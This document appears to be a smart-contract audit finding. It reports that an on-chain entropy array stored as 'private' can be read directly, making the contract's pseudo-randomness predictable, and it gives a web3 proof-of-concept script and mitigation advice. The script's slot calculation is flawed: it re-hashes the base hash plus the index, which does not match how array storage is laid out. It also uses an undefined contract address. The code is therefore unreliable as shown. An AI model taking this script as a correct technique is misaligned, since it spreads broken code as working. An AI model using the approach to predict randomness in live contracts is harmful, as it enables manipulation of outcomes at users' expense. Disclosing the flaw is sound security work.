# Vulnerability details

## Impact
The storage of private variables in Ethereum smart contracts does not guarantee their inaccessibility from outside the contract. Attackers can use low-level storage access techniques to retrieve values stored in specific storage slots. For example, `entropySlots`, which holds crucial entropy values, can be read directly, allowing attackers to predict the next entropy value and manipulate outcomes based on the pseudo-randomness generated by the contract.

## Proof of Concept
Using an Ethereum client or custom script, retrieve the storage slots corresponding to entropySlots and allowedCaller.
This is the example script to Access Storage Slots.

    async function main() {
      const web3 = new Web3(new Web3.providers.HttpProvider("http://127.0.0.1:8545"));

      // Slot where entropySlots array starts
      const entropySlotsBaseSlot = 0; // Base slot index for entropySlots array

      // Calculate the keccak256 hash of the base slot
      const entropySlotsBaseHash = web3.utils.sha3(web3.eth.abi.encodeParameter('uint256', entropySlotsBaseSlot));

      // Function to get storage value at a specific slot
      async function getStorageValue(slot: string) {
        const value = await web3.eth.getStorageAt(contractAddress, slot);
        console.log(`Slot ${slot}: ${value}`);
      }

      // Access specific slots in the entropySlots array
      for (let index = 0; index < 5; index++) { // Example: Accessing first 5 slots
        const slotHash = web3.utils.sha3(web3.eth.abi.encodeParameter('uint256', (BigInt(entropySlotsBaseHash!) + BigInt(index)).toString()));
        await getStorageValue(slotHash!);
      }
    }

## Recommended Mitigation Steps
Implement stricter access controls and avoid storing critical randomization parameters in publicly accessible storage slots. Consider using internal calculations and keeping sensitive values completely private.
Periodically update the entropy generation logic and monitor the contract for any signs of manipulation or predictability.
